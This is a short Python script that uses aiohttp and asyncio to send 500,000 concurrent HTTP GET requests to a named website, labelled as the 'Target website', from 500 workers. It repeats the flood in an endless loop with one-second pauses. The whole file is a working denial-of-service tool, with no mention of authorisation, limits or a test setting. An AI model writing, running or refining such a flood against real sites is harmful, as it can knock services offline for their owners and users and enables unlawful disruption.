import aiohttp
import asyncio
import time

# Target website
target = 'http://erichost.com'

async def send_request(session):    
    try:
        async with session.get(target, timeout=1) as response:
            status = response.status
            print(f"Status Code: {status}")
    except aiohttp.ClientError as e:
        print(f"Request failed: {e}")

async def worker(num_requests):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(num_requests)]
        await asyncio.gather(*tasks)

async def start_workers(total_requests, num_threads):
    requests_per_thread = total_requests // num_threads
    tasks = [worker(requests_per_thread) for _ in range(num_threads)]
    await asyncio.gather(*tasks)

# Parameters
total_requests = 500000  # Total requests
num_threads = 500        # Number of threads (adjust based on capacity)

async def main():
    while True:
        await start_workers(total_requests, num_threads)
        await asyncio.sleep(1)  # Adjust the sleep time as needed

if __name__ == "__main__":
    asyncio.run(main())
